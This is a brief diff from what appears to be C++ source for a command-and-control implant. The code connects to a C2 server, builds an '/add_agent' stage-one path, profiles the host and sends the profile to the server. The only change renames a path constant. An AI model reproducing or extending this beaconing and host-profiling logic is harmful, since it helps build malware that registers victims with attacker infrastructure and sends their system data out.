@@ -17,7 +17,7 @@ int main() {
             std::wstring C2 = C2Conn(URLS); 
             if (!C2.empty()) {
                 // Path to /add_agent
-                std::wstring PC2 = C2 + Stage1Path;
+                std::wstring PC2 = C2 + STAGE1PATH;
                 nlohmann::json JsonProfile = Profiler(); 
                 std::string response = SendProfile(PC2, JsonProfile);
                 auto jsonResp = nlohmann::json::parse(response);
